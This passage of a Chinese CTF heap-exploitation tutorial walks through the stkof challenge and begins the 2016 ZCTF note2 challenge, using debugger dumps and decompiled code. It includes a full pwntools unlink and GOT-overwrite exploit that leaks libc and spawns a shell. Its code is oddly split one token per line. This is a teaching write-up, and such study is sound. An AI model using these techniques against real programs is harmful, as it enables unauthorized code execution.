\u64cd\u4f5c\uff0c\u6240\u4ee5\u5728\u6267\u884c\u8f93\u5165\u8f93\u51fa\u64cd\u4f5c\u7684\u65f6\u5019\u4f1a\u7533\u8bf7\u7f13\u51b2\u533a\u3002\u8fd9\u91cc\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u4f1a\u7533\u8bf7\u4e24\u4e2a\u7f13\u51b2\u533a\uff0c\u5206\u522b\u5927\u5c0f\u4e3a1024 \u548c 1024\u3002\u5177\u4f53\u5982\u4e0b\uff0c\u53ef\u4ee5\u8fdb\u884c\u8c03\u8bd5\u67e5\u770b\n\n\n\u521d\u6b21\u8c03\u7528 fgets \u65f6\uff0cmalloc\u4f1a\u5206\u914d\u7f13\u51b2\u533a 1024 \u5927\u5c0f\u3002\n\n\n*RAX  0x0\n*RBX  0x400\n*RCX  0x7ffff7b03c34 (__fxstat64+20) \u25c2\u2014 cmp    rax, -0x1000 /* \nH=\n */\n*RDX  0x88\n*RDI  0x400\n*RSI  0x7fffffffd860 \u25c2\u2014 0x16\n*R8   0x1\n*R9   0x0\n*R10  0x7ffff7fd2700 \u25c2\u2014 0x7ffff7fd2700\n*R11  0x246\n*R12  0xa\n*R13  0x9\n R14  0x0\n*R15  0x7ffff7dd18e0 (_IO_2_1_stdin_) \u25c2\u2014 0xfbad2288\n*RBP  0x7ffff7dd18e0 (_IO_2_1_stdin_) \u25c2\u2014 0xfbad2288\n*RSP  0x7fffffffd858 \u2014\u25b8 0x7ffff7a7a1d5 (_IO_file_doallocate+85) \u25c2\u2014 mov    rsi, rax\n*RIP  0x7ffff7a91130 (malloc) \u25c2\u2014 push   rbp\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \u25ba 0x7ffff7a91130 \nmalloc\n        push   rbp \n0x7ffff7dd18e0\n\n...\uff0c\u7701\u7565\n \u25ba f 0     7ffff7a91130 malloc\n   f 1     7ffff7a7a1d5 _IO_file_doallocate+85\n   f 2     7ffff7a88594 _IO_doallocbuf+52\n   f 3     7ffff7a8769c _IO_file_underflow+508\n   f 4     7ffff7a8860e _IO_default_uflow+14\n   f 5     7ffff7a7bc6a _IO_getline_info+170\n   f 6     7ffff7a7bd78\n   f 7     7ffff7a7ab7d fgets+173\n   f 8           400d2e\n   f 9     7ffff7a2d830 __libc_start_main+240\n\n\n\n\n\u5206\u914d\u4e4b\u540e\uff0c\u5806\u5982\u4e0b\n\n\npwndbg\n heap\nTop Chunk: 0xe05410\nLast Remainder: 0\n\n0xe05000 PREV_INUSE {\n  prev_size = 0, \n  size = 1041, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n0xe05410 PREV_INUSE {\n  prev_size = 0, \n  size = 134129, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n\n\n\n\n\u5f53\u5206\u914d16\u5927\u5c0f\u7684\u5185\u5b58\u540e\uff0c\u5806\u5e03\u5c40\u5982\u4e0b\n\n\npwndbg\n heap\nTop Chunk: 0xe05430\nLast Remainder: 0\n\n0xe05000 PREV_INUSE {\n  prev_size = 0, \n  size = 1041, \n  fd = 0xa3631, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n0xe05410 FASTBIN {\n  prev_size = 0, \n  size = 33, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x20bd1\n}\n0xe05430 PREV_INUSE {\n  prev_size = 0, \n  size = 134097, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n\n\n\n\n\u5f53\u4f7f\u7528 printf \u51fd\u6570\uff0c\u4f1a\u5206\u914d 1024 \u5b57\u8282\u7a7a\u95f4\uff0c\u5982\u4e0b\n\n\n*RAX  0x0\n*RBX  0x400\n*RCX  0x7ffff7b03c34 (__fxstat64+20) \u25c2\u2014 cmp    rax, -0x1000 /* \nH=\n */\n*RDX  0x88\n*RDI  0x400\n*RSI  0x7fffffffd1c0 \u25c2\u2014 0x16\n R8   0x0\n*R9   0x0\n*R10  0x0\n*R11  0x246\n*R12  0x1\n*R13  0x7fffffffd827 \u25c2\u2014 0x31 /* \n1\n */\n R14  0x0\n*R15  0x400de4 \u25c2\u2014 and    eax, 0x2e000a64 /* \n%d\\n\n */\n*RBP  0x7ffff7dd2620 (_IO_2_1_stdout_) \u25c2\u2014 0xfbad2284\n*RSP  0x7fffffffd1b8 \u2014\u25b8 0x7ffff7a7a1d5 (_IO_file_doallocate+85) \u25c2\u2014 mov    rsi, rax\n*RIP  0x7ffff7a91130 (malloc) \u25c2\u2014 push   rbp\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \u25ba 0x7ffff7a91130 \nmalloc\n       push   rbp \n0x7ffff7dd2620\n\n\u3002\u3002\u3002\u7701\u7565\n\u25ba f 0     7ffff7a91130 malloc\n   f 1     7ffff7a7a1d5 _IO_file_doallocate+85\n   f 2     7ffff7a88594 _IO_doallocbuf+52\n   f 3     7ffff7a878f8 _IO_file_overflow+456\n   f 4     7ffff7a8628d _IO_file_xsputn+173\n   f 5     7ffff7a5ae00 vfprintf+3216\n   f 6     7ffff7a62899 printf+153\n   f 7           4009cd\n   f 8           400cb1\n   f 9     7ffff7a2d830 __libc_start_main+240\n\n\n\n\n\u5806\u5e03\u5c40\u5982\u4e0b\n\n\npwndbg\n heap\nTop Chunk: 0xe05840\nLast Remainder: 0\n\n0xe05000 PREV_INUSE {\n  prev_size = 0, \n  size = 1041, \n  fd = 0xa3631, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n0xe05410 FASTBIN {\n  prev_size = 0, \n  size = 33, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x411\n}\n0xe05430 PREV_INUSE {\n  prev_size = 0, \n  size = 1041, \n  fd = 0xa4b4f, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n0xe05840 PREV_INUSE {\n  prev_size = 0, \n  size = 133057, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n\n\n\n\n\u6b64\u540e\uff0c\u65e0\u8bba\u662f\u8f93\u5165\u8f93\u51fa\u90fd\u4e0d\u4f1a\u518d\u7533\u8bf7\u7f13\u51b2\u53bb\u4e86\u3002\u6240\u4ee5\u6211\u4eec\u6700\u597d\u6700\u521d\u7684\u7533\u8bf7\u4e00\u4e2a chunk \u6765\u628a\u8fd9\u4e9b\u7f13\u51b2\u533a\u7ed9\u7533\u8bf7\u4e86\uff0c\u65b9\u4fbf\u4e4b\u540e\u64cd\u4f5c\u3002\n\n\n\u4f46\u662f\uff0c\u6bd4\u8f83\u6709\u610f\u601d\u7684\u662f\uff0c\u5982\u679c\u6211\u4eec\u662f attach \u4e0a\u53bb\u7684\u8bdd\uff0c\u7b2c\u4e00\u4e2a\u7f13\u51b2\u533a\u5206\u914d\u7684\u5927\u5c0f\u4e3a 4096 \u5927\u5c0f\u3002\n\n\npwndbg\n heap\nTop Chunk: 0x1e9b010\nLast Remainder: 0\n\n0x1e9a000 PREV_INUSE {\n  prev_size = 0, \n  size = 4113, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n0x1e9b010 PREV_INUSE {\n  prev_size = 0, \n  size = 135153, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n\n\n\n\n\u57fa\u672c\u601d\u8def\n\n\n\u6839\u636e\u4e0a\u9762\u5206\u6790\uff0c\u6211\u4eec\u5728\u524d\u9762\u5148\u5206\u914d\u4e00\u4e2a chunk \u6765\u628a\u7f13\u51b2\u533a\u5206\u914d\u5b8c\u6bd5\uff0c\u4ee5\u514d\u5f71\u54cd\u4e4b\u540e\u7684\u64cd\u4f5c\u3002\n\n\n\u7531\u4e8e\u7a0b\u5e8f\u672c\u8eab\u6ca1\u6709 leak\uff0c\u8981\u60f3\u6267\u884c system \u7b49\u51fd\u6570\uff0c\u6211\u4eec\u7684\u9996\u8981\u76ee\u7684\u8fd8\u662f\u5148\u6784\u9020 leak\uff0c\u57fa\u672c\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u5229\u7528 unlink \u4fee\u6539 global[2] \u4e3a \nglobal[2]-0x18\u3002\n\n\n\u5229\u7528\u7f16\u8f91\u529f\u80fd\u4fee\u6539 global[0] \u4e3a free@got \u5730\u5740\uff0c\u540c\u65f6\u4fee\u6539 global[1] \u4e3aputs@got \u5730\u5740\uff0cglobal[2] \u4e3a atoi@got \u5730\u5740\u3002\n\n\n\u4fee\u6539 \nfree@got\n \u4e3a \nputs@plt\n \u7684\u5730\u5740\uff0c\u4ece\u800c\u5f53\u518d\u6b21\u8c03\u7528 \nfree\n \u51fd\u6570\u65f6\uff0c\u5373\u53ef\u76f4\u63a5\u8c03\u7528 puts \u51fd\u6570\u3002\u8fd9\u6837\u5c31\u53ef\u4ee5\u6cc4\u6f0f\u51fd\u6570\u5185\u5bb9\u3002 \n\n\nfree global[2]\uff0c\u5373\u6cc4\u6f0f puts@got \u5185\u5bb9\uff0c\u4ece\u800c\u77e5\u9053 system \u51fd\u6570\u5730\u5740\u4ee5\u53ca libc \u4e2d /bin/sh \u5730\u5740\u3002\n\n\n\u4fee\u6539 \natoi@got\n \u4e3a system \u51fd\u6570\u5730\u5740\uff0c\u518d\u6b21\u8c03\u7528\u65f6\uff0c\u8f93\u5165 /bin/sh \u5730\u5740\u5373\u53ef\u3002\n\n\n\n\n\u4ee3\u7801\u5982\u4e0b\n\n\ncontext\n.\nterminal\n \n=\n \n[\ngnome-terminal\n,\n \n-x\n,\n \nsh\n,\n \n-c\n]\n\n\nif\n \nargs\n[\nDEBUG\n]:\n\n    \ncontext\n.\nlog_level\n \n=\n \ndebug\n\n\ncontext\n.\nbinary\n \n=\n \n./stkof\n\n\nstkof\n \n=\n \nELF\n(\n./stkof\n)\n\n\nif\n \nargs\n[\nREMOTE\n]:\n\n    \np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n7777\n)\n\n\nelse\n:\n\n    \np\n \n=\n \nprocess\n(\n./stkof\n)\n\n\nlog\n.\ninfo\n(\nPID: \n \n+\n \nstr\n(\nproc\n.\npidof\n(\np\n)[\n0\n]))\n\n\nlibc\n \n=\n \nELF\n(\n./libc.so.6\n)\n\n\nhead\n \n=\n \n0x602140\n\n\n\n\ndef\n \nalloc\n(\nsize\n):\n\n    \np\n.\nsendline\n(\n1\n)\n\n    \np\n.\nsendline\n(\nstr\n(\nsize\n))\n\n    \np\n.\nrecvuntil\n(\nOK\n\\n\n)\n\n\n\n\ndef\n \nedit\n(\nidx\n,\n \nsize\n,\n \ncontent\n):\n\n    \np\n.\nsendline\n(\n2\n)\n\n    \np\n.\nsendline\n(\nstr\n(\nidx\n))\n\n    \np\n.\nsendline\n(\nstr\n(\nsize\n))\n\n    \np\n.\nsend\n(\ncontent\n)\n\n    \np\n.\nrecvuntil\n(\nOK\n\\n\n)\n\n\n\n\ndef\n \nfree\n(\nidx\n):\n\n    \np\n.\nsendline\n(\n3\n)\n\n    \np\n.\nsendline\n(\nstr\n(\nidx\n))\n\n\n\n\ndef\n \nexp\n():\n\n    \n# trigger to malloc buffer for io function\n\n    \nalloc\n(\n0x100\n)\n  \n# idx 1\n\n    \n# begin \n\n    \nalloc\n(\n0x30\n)\n  \n# idx 2\n\n    \n# small chunk size in order to trigger unlink\n\n    \nalloc\n(\n0x80\n)\n  \n# idx 3\n\n    \n# a fake chunk at global[2]=head+16 who\ns size is 0x20\n\n    \npayload\n \n=\n \np64\n(\n0\n)\n  \n#prev_size\n\n    \npayload\n \n+=\n \np64\n(\n0x20\n)\n  \n#size\n\n    \npayload\n \n+=\n \np64\n(\nhead\n \n+\n \n16\n \n-\n \n0x18\n)\n  \n#fd\n\n    \npayload\n \n+=\n \np64\n(\nhead\n \n+\n \n16\n \n-\n \n0x10\n)\n  \n#bk\n\n    \npayload\n \n+=\n \np64\n(\n0x20\n)\n  \n# next chunk\ns prev_size bypass the check\n\n    \npayload\n \n=\n \npayload\n.\nljust\n(\n0x30\n,\n \na\n)\n\n    \n# overwrite global[3]\ns chunk\ns prev_size\n\n    \n# make it believe that prev chunk is at global[2]\n\n    \npayload\n \n+=\n \np64\n(\n0x30\n)\n\n    \n# make it believe that prev chunk is free\n\n    \npayload\n \n+=\n \np64\n(\n0x90\n)\n\n    \nedit\n(\n2\n,\n \nlen\n(\npayload\n),\n \npayload\n)\n\n    \n# unlink fake chunk, so global[2] =\n(global[2])-0x18=head-8\n\n    \nfree\n(\n3\n)\n\n    \np\n.\nrecvuntil\n(\nOK\n\\n\n)\n\n    \n#gdb.attach(p)\n\n    \n# overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got\n\n    \npayload\n \n=\n \na\n \n*\n \n8\n \n+\n \np64\n(\nstkof\n.\ngot\n[\nfree\n])\n \n+\n \np64\n(\nstkof\n.\ngot\n[\nputs\n])\n \n+\n \np64\n(\n\n        \nstkof\n.\ngot\n[\natoi\n])\n\n    \nedit\n(\n2\n,\n \nlen\n(\npayload\n),\n \npayload\n)\n\n    \n# edit free@got to puts@plt\n\n    \npayload\n \n=\n \np64\n(\nstkof\n.\nplt\n[\nputs\n])\n\n    \nedit\n(\n0\n,\n \nlen\n(\npayload\n),\n \npayload\n)\n\n\n    \n#free global[1] to leak puts addr\n\n    \nfree\n(\n1\n)\n\n    \nputs_addr\n \n=\n \np\n.\nrecvuntil\n(\n\\n\nOK\n\\n\n,\n \ndrop\n=\nTrue\n)\n.\nljust\n(\n8\n,\n \n\\x00\n)\n\n    \nputs_addr\n \n=\n \nu64\n(\nputs_addr\n)\n\n    \nlog\n.\nsuccess\n(\nputs addr: \n \n+\n \nhex\n(\nputs_addr\n))\n\n    \nlibc_base\n \n=\n \nputs_addr\n \n-\n \nlibc\n.\nsymbols\n[\nputs\n]\n\n    \nbinsh_addr\n \n=\n \nlibc_base\n \n+\n \nnext\n(\nlibc\n.\nsearch\n(\n/bin/sh\n))\n\n    \nsystem_addr\n \n=\n \nlibc_base\n \n+\n \nlibc\n.\nsymbols\n[\nsystem\n]\n\n    \nlog\n.\nsuccess\n(\nlibc base: \n \n+\n \nhex\n(\nlibc_base\n))\n\n    \nlog\n.\nsuccess\n(\n/bin/sh addr: \n \n+\n \nhex\n(\nbinsh_addr\n))\n\n    \nlog\n.\nsuccess\n(\nsystem addr: \n \n+\n \nhex\n(\nsystem_addr\n))\n\n    \n# modify atoi@got to system addr\n\n    \npayload\n \n=\n \np64\n(\nsystem_addr\n)\n\n    \nedit\n(\n2\n,\n \nlen\n(\npayload\n),\n \npayload\n)\n\n    \np\n.\nsend\n(\np64\n(\nbinsh_addr\n))\n\n    \np\n.\ninteractive\n()\n\n\n\n\nif\n \n__name__\n \n==\n \n__main__\n:\n\n    \nexp\n()\n\n\n\n\n\n2016 ZCTF note2\n\n\n\u5206\u6790\u7a0b\u5e8f\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u5148\u5206\u6790\u4e00\u4e0b\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u7684\u4e3b\u8981\u529f\u80fd\u4e3a\n\n\n\n\n\u6dfb\u52a0note\uff0csize\u9650\u5236\u4e3a0x80\uff0csize\u4f1a\u88ab\u8bb0\u5f55\uff0cnote\u6307\u9488\u4f1a\u88ab\u8bb0\u5f55\u3002\n\n\n\u5c55\u793anote\u5185\u5bb9\u3002\n\n\n\u7f16\u8f91note\u5185\u5bb9\uff0c\u5176\u4e2d\u5305\u62ec\u8986\u76d6\u5df2\u6709\u7684note\uff0c\u5728\u5df2\u6709\u7684note\u540e\u9762\u6dfb\u52a0\u5185\u5bb9\u3002\n\n\n\u91ca\u653enote\u3002\n\n\n\n\n\u4ed4\u7ec6\u5206\u6790\u540e\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u6709\u4ee5\u4e0b\u51e0\u4e2a\u95ee\u9898\n\n\n\n\n\u5728\u6dfb\u52a0note\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u8bb0\u5f55note\u5bf9\u5e94\u7684\u5927\u5c0f\uff0c\u8be5\u5927\u5c0f\u4f1a\u7528\u4e8e\u63a7\u5236\u8bfb\u53d6note\u7684\u5185\u5bb9\uff0c\u4f46\u662f\u8bfb\u53d6\u7684\u5faa\u73af\u53d8\u91cfi\u662f\u65e0\u7b26\u53f7\u53d8\u91cf\uff0c\u6240\u4ee5\u6bd4\u8f83\u65f6\u90fd\u4f1a\u8f6c\u6362\u4e3a\u65e0\u7b26\u53f7\u53d8\u91cf\uff0c\u90a3\u4e48\u5f53\u6211\u4eec\u8f93\u5165size\u4e3a0\u65f6\uff0cglibc\u6839\u636e\u5176\u89c4\u5b9a\uff0c\u4f1a\u5206\u914d0x20\u4e2a\u5b57\u8282\uff0c\u4f46\u662f\u7a0b\u5e8f\u8bfb\u53d6\u7684\u5185\u5bb9\u5374\u5e76\u4e0d\u53d7\u5230\u9650\u5236\uff0c\u6545\u800c\u4f1a\u4ea7\u751f\u5806\u6ea2\u51fa\u3002\n\n\n\u7a0b\u5e8f\u5728\u6bcf\u6b21\u7f16\u8f91note\u65f6\uff0c\u90fd\u4f1a\u7533\u8bf70xa0\u5927\u5c0f\u7684\u5185\u5b58\uff0c\u4f46\u662f\u5728 free \u4e4b\u540e\u5e76\u6ca1\u6709\u8bbe\u7f6e\u4e3aNULL\u3002\n\n\n\n\n\u7b2c\u4e00\u4e2a\u95ee\u9898\u5bf9\u5e94\u5728ida\u4e2d\u7684\u4ee3\u7801\u5982\u4e0b\n\n\nunsigned\n \n__int64\n \n__fastcall\n \nReadLenChar\n(\n__int64\n \na1\n,\n \n__int64\n \na2\n,\n \nchar\n \na3\n)\n\n\n{\n\n  \nchar\n \nv4\n;\n \n// [sp+Ch] [bp-34h]@1\n\n  \nchar\n \nbuf\n;\n \n// [sp+2Fh] [bp-11h]@2\n\n  \nunsigned\n \n__int64\n \ni\n;\n \n// [sp+30h] [bp-10h]@1\n\n  \n__int64\n \nv7\n;\n \n// [sp+38h] [bp-8h]@2\n\n\n  \nv4\n \n=\n \na3\n;\n\n  \nfor\n \n(\n \ni\n \n=\n \n0LL\n;\n \na2\n \n-\n \n1\n \n \ni\n;\n \n++\ni\n \n)\n\n  \n{\n\n    \nv7\n \n=\n \nread\n(\n0\n,\n \nbuf\n,\n \n1uLL\n);\n\n    \nif\n \n(\n \nv7\n \n=\n \n0\n \n)\n\n      \nexit\n(\n-\n1\n);\n\n    \nif\n \n(\n \nbuf\n \n==\n \nv4\n \n)\n\n      \nbreak\n;\n\n    \n*\n(\n_BYTE\n \n*\n)(\ni\n \n+\n \na1\n)\n \n=\n \nbuf\n;\n\n  \n}\n\n  \n*\n(\n_BYTE\n \n*\n)(\na1\n \n+\n \ni\n)\n \n=\n \n0\n;\n\n  \nreturn\n \ni\n;\n\n\n}\n\n\n\n\n\n\u5176\u4e2di\u662funsigned\u7c7b\u578b\uff0ca2\u4e3aint\u7c7b\u578b\uff0c\u6240\u4ee5\u4e24\u8005\u5728for\u5faa\u73af\u76f8\u6bd4\u8f83\u7684\u65f6\u5019\uff0ca2-1\u7684\u7ed3\u679c-1\u4f1a\u88ab\u89c6\u4e3aunsigned\u7c7b\u578b\uff0c\u6b64\u65f6\uff0c\u5373\u6700\u5927\u7684\u6574\u6570\u3002\u6240\u4ee5\u8bf4\u53ef\u4ee5\u8bfb\u53d6\u4efb\u610f\u957f\u5ea6\u7684\u6570\u636e\uff0c\u8fd9\u91cc\u4e5f\u5c31\u662f\u540e\u9762\u6211\u4eec\u6ea2\u51fa\u6240\u4f7f\u7528\u7684\u529e\u6cd5\u3002\n\n\n\u57fa\u672c\u601d\u8def\n\n\n\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u5229\u7528\u53d1\u73b0\u7684\u7b2c\u4e00\u4e2a\u95ee\u9898\uff0c\u4e3b\u8981\u5229\u7528\u4e86 fastbin \u7684\u673a\u5236\u3001unlink \u7684\u673a\u5236\u3002\n\n\n\u4e0b\u9762\u4f9d\u6b21\u8fdb\u884c\u8bb2\u89e3\u3002\n\n\n\u57fa\u672c\u64cd\u4f5c\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u5148\u628anote\u53ef\u80fd\u7684\u57fa\u672c\u64cd\u4f5c\u5217\u4e3e\u51fa\u6765\u3002\n\n\np\n \n=\n \nprocess\n(\n./note2\n)\n\n\nnote2\n \n=\n \nELF\n(\n./note2\n)\n\n\nlibc\n \n=\n \nELF\n(\n/lib/x86_64-linux-gnu/libc.so.6\n)\n\n\ncontext\n.\nlog_level\n \n=\n \ndebug\n\n\n\n\ndef\n \nnewnote\n(\nlength\n,\n \ncontent\n):\n\n    \np\n.\nrecvuntil\n(\noption---\n)\n\n    \np\n.\nsendline\n(\n1\n)\n\n    \np\n.\nrecvuntil\n(\n(less than 128)\n)\n\n    \np\n.\nsendline\n(\nstr\n(\nlength\n))\n\n    \np\n.\nrecvuntil\n(\ncontent:\n)\n\n    \np\n.\nsendline\n(\ncontent\n)\n\n\n\n\ndef\n \nshownote\n(\nid\n):\n\n    \np\n.\nrecvuntil\n(\noption---\n)\n\n    \np\n.\nsendline\n(\n2\n)\n\n    \np\n.\nrecvuntil\n(\nnote:\n)\n\n    \np\n.\nsendline\n(\nstr\n(\nid\n))\n\n\n\n\ndef\n \neditnote\n(\nid\n,\n \nchoice\n,\n \ns\n):\n\n    \np\n.\nrecvuntil\n(\noption---\n)\n\n    \np\n.\nsendline\n(\n3\n)\n\n    \np\n.\nrecvuntil\n(\nnote:\n)\n\n    \np\n.\nsendline\n(\nstr\n(\nid\n))\n\n    \np\n.\nrecvuntil\n(\n2.append]\n)\n\n    \np\n.\nsendline\n(\nstr\n(\nchoice\n))\n\n    \np\n.\nsendline\n(\ns\n)\n\n\n\n\ndef\n \ndeletenote\n(\nid\n):\n\n    \np\n.\nrecvuntil\n(\noption---\n)\n\n    \np\n.\nsendline\n(\n4\n)\n\n    \np\n.\nrecvuntil\n(\nnote:\n)\n\n    \np\n.\nsendline\n(\nstr\n(\nid\n))\n\n\n\n\n\n\u751f\u6210\u4e09\u4e2anote\n\n\n\u8fd9\u4e00\u90e8\u5206\u5bf9\u5e94\u7684\u4ee3\u7801\u5982\u4e0b\n\n\n# chunk0: a fake chunk\n\n\nptr\n \n=\n \n0x0000000000602120\n\n\nfakefd\n \n=\n \nptr\n \n-\n \n0x18\n\n\nfakebk\n \n=\n \nptr\n \n-\n \n0x10\n\n\ncontent\n \n=\n \na\n \n*\n \n8\n \n+\n \np64\n(\n0x61\n)\n \n+\n \np64\n(\nfakefd\n)\n \n+\n \np64\n(\nfakebk\n)\n \n+\n \nb\n \n*\n \n64\n \n+\n \np64\n(\n0x60\n)\n\n\n#content = p64(fakefd) + p64(fakebk)\n\n\nnewnote\n(\n128\n,\n \ncontent\n)\n\n\n# chunk1: a zero size chunk produce overwrite\n\n\nnewnote\n(\n0\n,\n \na\n \n*\n \n8\n)\n\n\n# chunk2: a chunk to be overwrited and freed\n\n\nnewnote\n(\n0x80\n,\n \nb\n \n*\n \n16\n)\n\n\n\n\n\n\u5176\u4e2d\u8fd9\u4e09\u4e2anote\u7684\u5927\u5c0f\u5206\u522b\u4e3a0x80\uff0c0\uff0c0x80\uff0c\u7b2c\u4e8c\u4e2achunk\u867d\u7136\u7533\u8bf7\u7684\u5927\u5c0f\u4e3a0\uff0c\u4f46\u662fglibc\u7684\u8981\u6c42chunk\u5757\u81f3\u5c11\u53ef\u4ee5\u5b58\u50a84\u4e2a\u5fc5\u8981\u7684\u5b57\u6bb5(prev_size,size,fd,bk)\uff0c\u6240\u4ee5\u4f1a\u5206\u914d0x20\u7684\u7a7a\u95f4\u3002\u540c\u65f6\uff0c\u7531\u4e8e\u65e0\u7b26\u53f7\u6574\u6570\u7684\u6bd4\u8f83\u95ee\u9898\uff0c\u53ef\u4ee5\u4e3a\u8be5note\u8f93\u5165\u4efb\u610f\u957f\u7684\u5b57\u7b26\u4e32\u3002\n\n\n\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cchunk1\u4e2d\u4e00\u5171\u6784\u9020\u4e86\u4e24\u4e2achunk\n\n\n\n\nchunk ptr[0]\uff0c\u8fd9\u4e2a\u662f\u4e3a\u4e86unlink\u65f6\u4fee\u6539\u5bf9\u5e94\u7684\u503c\u3002\n\n\nchunk ptr[0]'s nextchunk\uff0c\u8fd9\u4e2a\u662f\u4e3a\u4e86\u4f7f\u5f97unlink\u65f6\u7684\u7b2c\u4e00\u4e2a\u68c0\u67e5\u6ee1\u8db3\u3002\n\n\n\n\n    \n// \u7531\u4e8eP\u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4\u3002\n\n    \nif\n \n(\n__builtin_expect\n \n(\nchunksize\n(\nP\n)\n \n!=\n \nprev_size\n \n(\nnext_chunk\n(\nP\n)),\n \n0\n))\n      \\\n      \nmalloc_printerr\n \n(\ncorrupted size vs. prev_size\n);\n               \\\n\n\n\n\n\u5f53\u6784\u9020\u5b8c\u4e09\u4e2a note \u540e\uff0c\u5806\u7684\u57fa\u672c\u6784\u9020\u5982\u56fe1\u6240\u793a\u3002\n\n\n                                   +-----------------+ high addr\n                                   |      ...        |\n                                   +-----------------+\n                                   |      \nb\n*8      |\n                ptr[2]-----------\n +-----------------+\n                                   |    size=0x91    |\n                                   +-----------------+\n                                   |    prevsize     |\n                                   +-----------------+------------\n                                   |    unused       |\n                                   +-----------------+\n                                   |    \na\n*8        |\n                 ptr[1]----------\n +-----------------+  chunk 1\n                                   |    size=0x20    |\n                                   +-----------------+\n                                   |    prevsize     |\n                                   +-----------------+-------------\n                                   |    unused       |\n                                   +-----------------+\n                                   |  prev_size=0x60 |\nfake ptr[0] chunk\ns nextchunk-----\n+-----------------+\n                                   |    64*\na\n       |\n                                   +-----------------+\n                                   |    fakebk       |\n                                   +-----------------+\n                                   |    fakefd       |\n                                   +-----------------+\n                                   |    0x61         |  chunk 0\n                                   +-----------------+\n                                   |    \na *8        |\n                 ptr[0]----------\n +-----------------+\n                                   |    size=0x91    |\n                                   +-----------------+\n                                   |    prev_size    |\n                                   +-----------------+  low addr\n                                           \u56fe1\n\n\n\n\n\u91ca\u653echunk1-\u8986\u76d6chunk2-\u91ca\u653echunk2\n\n\n\u5bf9\u5e94\u7684\u4ee3\u7801\u5982\u4e0b\n\n\n# edit the chunk1 to overwrite the chunk2\n\n\ndeletenote\n(\n1\n)\n\n\ncontent\n \n=\n \na\n \n*\n \n16\n \n+\n \np64\n(\n0xa0\n)\n \n+\n \np64\n(\n0x90\n)\n\n\nnewnote\n(\n0\n,\n \ncontent\n)\n\n\n# delete note 2 to trigger the unlink\n\n\n# after unlink, ptr[0] = ptr - 0x18\n\n\ndeletenote\n(\n2\n)\n\n\n\n\n\n\u9996\u5148\u91ca\u653e 